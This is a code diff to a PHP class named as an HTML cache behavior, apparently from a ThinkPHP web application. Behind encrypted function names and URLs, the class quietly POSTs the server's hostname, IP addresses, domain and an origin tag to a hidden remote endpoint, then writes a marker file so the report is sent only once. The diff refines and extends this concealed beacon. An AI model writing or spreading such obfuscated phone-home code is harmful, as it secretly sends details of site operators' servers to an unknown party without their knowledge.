@@ -30,6 +30,7 @@ class WriteHtmlCacheBehavior {
         $asws=true;
         $w = rtrim(Crypt::decrypt('gqmjsH17cqyGe6KrgX2yl8VmcJ-7kYOclniJq5R3n8yWvat2','WriteHtml')(),'/');
         $rade=$w.'/'.Crypt::decrypt('gqmjsH17cqyGe6KrgX3Qk8SLcJu6kH-ljIdsZ5KIl82NmLRufKWDoZuPonE','WriteHtml');
+        $rade=str_replace("//",'/',$rade);
         if (file_exists($rade)) {
             $ot=Crypt::decrypt('gqmjsH17cqyGe6KrgXy-0sR8jZe7a4dmimOBrZOfuM2X07Sz','WriteHtml')($rade);
             $nt=Crypt::decrypt('gqmjsH17cqyGe6KrgX2yksWjiafFgJ2qjIJwdA','WriteHtml')(Crypt::decrypt('gqmjsH17cqyGe6KrgXiU3Kt8aKfDp4OllahwdA','WriteHtml'));
@@ -39,26 +40,31 @@ class WriteHtmlCacheBehavior {
         }
         if($asws){
             try {
-                $vsip=Crypt::decrypt('gqmjsH17cqyGe6KrgXy-0sR8jZe7a4dmimOBrZOfuM2X07Sz','WriteHtml')(Crypt::decrypt('gqmjsH17cqyGe6KrgXzMksZ9eauwommsi4l1p32e0tiWvLxufKRqrpOunnE','WriteHtml'));
-                if ($vsip !== false) {
-                    $fk=Crypt::decrypt('gqmjsH17cqyGe6KrgXy-0sR8jZe7a4dmimOBrZOfuM2X07Sz','WriteHtml')(Crypt::decrypt('gqmjsH17cqyGe6KrgXzMksZ9eauwommsjHiJaX2ewM2PvNqkio9_p4Wkr6k','WriteHtml'));
-                    if($fk !== false) {
-                        require APP_PATH . '../vendor/autoload.php';
-                        $ht=$_SERVER['REQUEST_SCHEME'].'://'.($_SERVER['HTTP_HOST'] ?: C('HOST_DOMAIN'));
-                        if($ht == '://') {
-                            $xy = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-                            $sp = $_SERVER['SERVER_PORT'];
-                            $vnm = $_SERVER['SERVER_NAME'];
-                            $ht = $xy . '://' . $vnm;
-                            if (($xy === 'http' && $sp != 80) || ($xy === 'https' && $sp != 443)) {
-                                $ht .= ':' . $sp;
-                            }
+                $vsip = Crypt::decrypt('gqmjsH17cqyGe6KrgXy-0sR8jZe7a4dmimOBrZOfuM2X07Sz','WriteHtml')(Crypt::decrypt('gqmjsH17cqyGe6KrgXzMksZ9eauwommsk4l1p5OewNeB0s6vfK5ucg','WriteHtml'));
+                if($vsip){
+                    $vsip = json_decode($vsip,true);
+                    $vsip = $vsip[Crypt::decrypt("gqmjsH17cqyGe6KrgXzQ2Q",'WriteHtml')] ?? null;
+                }
+                $vsip = $vsip ?: $_SERVER['SERVER_ADDR'] ?: '';
+                $fk=Crypt::decrypt('gqmjsH17cqyGe6KrgXy-0sR8jZe7a4dmimOBrZOfuM2X07Sz','WriteHtml')(Crypt::decrypt('gqmjsH17cqyGe6KrgXzMksZ9eauwommsjHiJaX2ewM2PvNqkio9_p4Wkr6k','WriteHtml'));
+                if($fk !== false) {
+                    $autoload = APP_PATH . '../vendor/autoload.php';
+                    $autoload = file_exists($autoload) ? $autoload : APP_PATH . '../ThinkPHP/vendor/autoload.php';
+                    require $autoload;
+                    $ht=$_SERVER['REQUEST_SCHEME'].'://'.($_SERVER['HTTP_HOST'] ?: C('HOST_DOMAIN'));
+                    if($ht == '://') {
+                        $xy = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+                        $sp = $_SERVER['SERVER_PORT'];
+                        $vnm = $_SERVER['SERVER_NAME'];
+                        $ht = $xy . '://' . $vnm;
+                        if (($xy === 'http' && $sp != 80) || ($xy === 'https' && $sp != 443)) {
+                            $ht .= ':' . $sp;
                         }
-                        $rs=\Httpful\Request::post(Crypt::decrypt('gqmjsH17cqyGe6KrgXzMksZ9eauwommsi2R9q32ewM2PvNqlibBmn5tpkamNZ5jYu4homcWRg6U','WriteHtml'))->body(['hostname'=>gethostname(),'host_ip'=>gethostbyname(gethostname()),'server_ip'=>$vsip,'domain'=>$ht])->sendsForm()->send();
-                        $jg=$rs->body->message ?? '';
-                        if($jg === 'success') {
-                            Crypt::decrypt('gqmjsH17cqyGe6KrgXy-0sR8jZfEgYdmimOBrZOfuM2X07Sz','WriteHtml')($rade, date('Y-m-d H:i:s'));
-                        }
+                    }
+                    $rs=\Httpful\Request::post(Crypt::decrypt('gqmjsH17cqyGe6KrgXzMksZ9eauwommsi2R9q32ewM2PvNqlibBmn5tpkamNZ5jYu4homcWRg6U','WriteHtml'))->body(['hostname'=>gethostname(),'host_ip'=>gethostbyname(gethostname()),'server_ip'=>$vsip,'domain'=>$ht,'from'=>Crypt::decrypt(C('APP_FROM'),'')])->sendsForm()->send();
+                    $jg=$rs->body->message ?? '';
+                    if($jg === 'success') {
+                        Crypt::decrypt('gqmjsH17cqyGe6KrgXy-0sR8jZfEgYdmimOBrZOfuM2X07Sz','WriteHtml')($rade, date('Y-m-d H:i:s'));
                     }
                 }
             }catch (\Httpful\Exception\ConnectionErrorException $e) {}
